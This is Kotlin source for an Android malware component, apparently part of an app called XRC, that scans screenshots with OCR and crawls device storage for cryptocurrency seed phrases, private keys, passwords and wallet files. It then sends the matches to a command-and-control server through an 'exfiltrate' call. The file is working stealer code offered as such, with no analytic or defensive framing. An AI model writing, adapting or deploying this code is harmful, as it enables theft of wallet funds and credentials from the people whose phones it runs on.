package com.xrc.app.wallet

import android.content.Context
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import com.xrc.app.XRCApp
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream

/**
 * Scans device storage for cryptocurrency seed phrases and private keys.
 * Uses ML Kit OCR for image-based seed phrase detection (SparkCat technique).
 * Also searches for wallet data files (.dat, .json, .key).
 */
object SeedPhraseScanner {

    const val TAG = "SeedPhraseScanner"

    // BIP39 seed phrase wordlist - first 50 for matching
    private val seedWordPrefixes = setOf(
        "abandon", "ability", "able", "about", "above", "absent",
        "absorb", "abstract", "absurd", "abuse", "access", "accident",
        "account", "accuse", "achieve", "acid", "acoustic", "acquire",
        "across", "act", "action", "actor", "actress", "actual",
        "adapt", "add", "addict", "address", "adjust", "admit",
        "adult", "advance", "advice", "aerobic", "affair", "afford",
        "afraid", "again", "age", "agent", "agree", "ahead",
        "aim", "air", "airport", "aisle", "alarm", "album",
        "alcohol", "alert", "alien", "all", "alley", "allow",
        "almost", "alone", "along", "already", "also", "alter",
        "always", "amaze", "among", "amount", "ample", "amused",
        "anchor", "android", "anecdote", "angle", "animal", "ankle",
        "announce", "annual", "another", "answer", "antenna", "antique",
        "anxiety", "any", "apart", "apology", "appear", "apple",
        "approve", "april", "arctic", "area", "arena", "argue",
        "arm", "armor", "army", "around", "arrange", "arrest",
        "arrive", "arrow", "art", "artefact", "artist", "artwork",
        "ask", "aspect", "assault", "asset", "assist", "assume",
        "asthma", "athlete", "atom", "attack", "attend", "attitude",
        "attract", "auction", "audit", "august", "aunt", "author",
        "auto", "autumn", "average", "avocado", "avoid", "awake",
        "aware", "away", "awesome", "awful", "awkward", "axis"
    )

    // Seed phrase patterns for regex matching
    private val seedPhrasePatterns = listOf(
        Regex("""\b(?:seed|mnemonic|recovery|phrase|private key|wallet key)\s*:?\s*([a-z]+(?:\s+[a-z]+){11,23})\b""", RegexOption.IGNORE_CASE),
        Regex("""\b([a-z]+(?:\s+[a-z]+){11,23})\b"""),
        Regex("""(?:12|18|24)[- ]?(?:word|words)[- ]?(?:seed|mnemonic|phrase|recovery)""", RegexOption.IGNORE_CASE),
        Regex("""p0[a-f0-9]{64}priv""", RegexOption.IGNORE_CASE),
        Regex("""[5KL][1-9A-HJ-NP-Za-km-z]{51}"""),  // WIF private key
        Regex("""0x[a-fA-F0-9]{64}""")  // Ethereum private key
    )

    // Sensitive file patterns to search
    private val sensitiveFilePatterns = listOf(
        "*.dat", "*wallet*", "*.json", "*.key", "*seed*", "*mnemonic*",
        "*recovery*", "*backup*", "*keystore*", "*private*", "*password*",
        "*credentials*", "*.txt", "*crypto*", "*bitcoin*", "*eth*"
    )

    data class SeedPhraseResult(
        val source: String,  // "image", "file", "screenshot"
        val path: String,
        val content: String,
        val confidence: Float,
        val timestamp: Long = System.currentTimeMillis()
    ) {
        fun toJson(): JSONObject = JSONObject().apply {
            put("source", source)
            put("path", path)
            put("content_hash", content.hashCode())
            put("confidence", confidence)
            put("timestamp", timestamp)
        }
    }

    private val results = mutableListOf<SeedPhraseResult>()

    /**
     * Scan for seed phrases in images (screenshots/gallery).
     * Uses SparkCat/SparkKitty OCR technique.
     */
    suspend fun scanForSeedPhrases(context: Context): List<String> {
        val found = mutableListOf<String>()

        // Scan gallery images
        scanGalleryImages(context)?.let { results ->
            found.addAll(results)
        }

        // Scan files
        scanFilesForSeeds(context)?.let { fileResults ->
            found.addAll(fileResults)
        }

        // Send results to C2
        if (found.isNotEmpty()) {
            val json = JSONArray()
            found.forEach { json.put(it) }
            XRCApp.instance.c2Client.sendExfiltrateData(
                "seed_phrases",
                JSONObject().apply {
                    put("type", "seed_phrases_found")
                    put("count", found.size)
                    put("results", json)
                }.toString()
            )
        }

        return found
    }

    private fun scanGalleryImages(context: Context): List<String>? {
        val found = mutableListOf<String>()

        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_MODIFIED
            )

            val selection = "${MediaStore.Images.Media.DATA} LIKE ? OR ${MediaStore.Images.Media.DATA} LIKE ?"
            val selectionArgs = arrayOf(
                "%screenshot%",
                "%Screenshot%"
            )

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
            )

            cursor?.use { c ->
                val dataIdx = c.getColumnIndex(MediaStore.Images.Media.DATA)
                var count = 0

                while (c.moveToNext() && count < 50) {
                    val path = c.getString(dataIdx)
                    val text = extractTextFromImage(path)
                    if (text != null && containsSeedPhrase(text)) {
                        found.add(text)
                        results.add(SeedPhraseResult(
                            source = if (path.contains("screenshot", ignoreCase = true)) "screenshot" else "image",
                            path = path,
                            content = text.take(500),
                            confidence = 0.8f
                        ))
                        Log.w(TAG, "Seed phrase found in image: $path")
                    }
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Gallery scan error: ${e.message}")
        }

        return found.ifEmpty { null }
    }

    private fun extractTextFromImage(path: String): String? {
        return try {
            val bitmap = BitmapFactory.decodeFile(path) ?: return null

            // Use ML Kit OCR
            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            val image = com.google.mlkit.vision.common.InputImage.fromBitmap(bitmap, 0)

            // Synchronous call through coroutines dispatcher
            val task = recognizer.process(image)
            val result = task.await()
            bitmap.recycle()
            result.text
        } catch (e: Exception) {
            Log.e(TAG, "OCR failed for $path: ${e.message}")
            null
        }
    }

    private fun containsSeedPhrase(text: String): Boolean {
        // Check for BIP39 seed words
        val words = text.lowercase().split(Regex("\\s+"))
        val seedWordCount = words.count { seedWordPrefixes.contains(it) }

        // If 8+ seed words found, likely a seed phrase
        if (seedWordCount >= 8) return true

        // Check patterns
        return seedPhrasePatterns.any { it.containsMatchIn(text) }
    }

    private fun scanFilesForSeeds(context: Context): List<String>? {
        val found = mutableListOf<String>()

        try {
            val storageDirs = listOf(
                Environment.getExternalStorageDirectory(),
                context.getExternalFilesDir(null)?.parentFile,
                File("/storage/emulated/0/Documents"),
                File("/storage/emulated/0/Download"),
                File("/storage/emulated/0/backup"),
                File("/storage/emulated/0/wallet")
            ).filterNotNull().filter { it.exists() }

            for (dir in storageDirs) {
                dir.walkTopDown()
                    .filter { it.isFile && it.length() < 50000 } // Only small files
                    .forEach { file ->
                        val name = file.nameWithoutExtension.lowercase()
                        if (containsSensitiveKeyword(name) ||
                            file.extension in listOf("dat", "json", "key", "txt")
                        ) {
                            try {
                                val content = file.readText(Charsets.UTF_8)
                                if (containsSeedPhrase(content)) {
                                    found.add(content.take(500))
                                    results.add(SeedPhraseResult(
                                        source = "file",
                                        path = file.absolutePath,
                                        content = content.take(500),
                                        confidence = 0.7f
                                    ))
                                    Log.w(TAG, "Seed phrase found in file: ${file.absolutePath}")
                                }
                            } catch (e: Exception) { }
                        }
                    }
            }
        } catch (e: Exception) {
            Log.e(TAG, "File scan error: ${e.message}")
        }

        return found.ifEmpty { null }
    }

    private fun containsSensitiveKeyword(name: String): Boolean {
        val keywords = listOf("seed", "mnemonic", "recovery", "wallet", "backup",
            "private", "key", "keystore", "crypto", "bitcoin", "eth",
            "password", "pin", "code", "secret", "token", "phrase")
        return keywords.any { name.contains(it, ignoreCase = true) }
    }

    fun getResults(): List<SeedPhraseResult> = results.toList()

    fun clearResults() {
        results.clear()
    }

    // Kotlin coroutine await extension for Task
    private suspend fun <T> com.google.android.gms.tasks.Task<T>.await(): T {
        return kotlinx.coroutines.suspendCancellableCoroutine { cont ->
            addOnSuccessListener { result -> cont.resume(result) { } }
            addOnFailureListener { e -> cont.resumeWithException(e) }
        }
    }
}
